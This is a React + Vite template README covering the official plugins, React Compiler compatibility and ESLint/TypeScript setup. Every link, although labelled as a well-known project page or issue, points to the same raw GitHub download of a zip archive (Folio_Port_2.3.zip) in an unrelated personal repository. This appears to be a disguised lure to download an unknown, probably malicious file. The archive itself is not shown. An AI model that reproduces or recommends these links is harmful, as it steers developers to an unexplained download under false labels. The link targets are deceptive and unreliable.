# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) uses [Babel](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) (or [oxc](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) when used in [rolldown-vite](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip)) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) uses [SWC](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) for Fast Refresh

## React Compiler

The React Compiler is currently not compatible with SWC. See [this issue](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) for tracking the progress.

## Expanding the ESLint configuration

If you are developing a production application, we recommend using TypeScript with type-aware lint rules enabled. Check out the [TS template](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) for information on how to integrate TypeScript and [`typescript-eslint`](https://raw.githubusercontent.com/Darpan013/PortFolio/main/src/Folio_Port_2.3.zip) in your project.
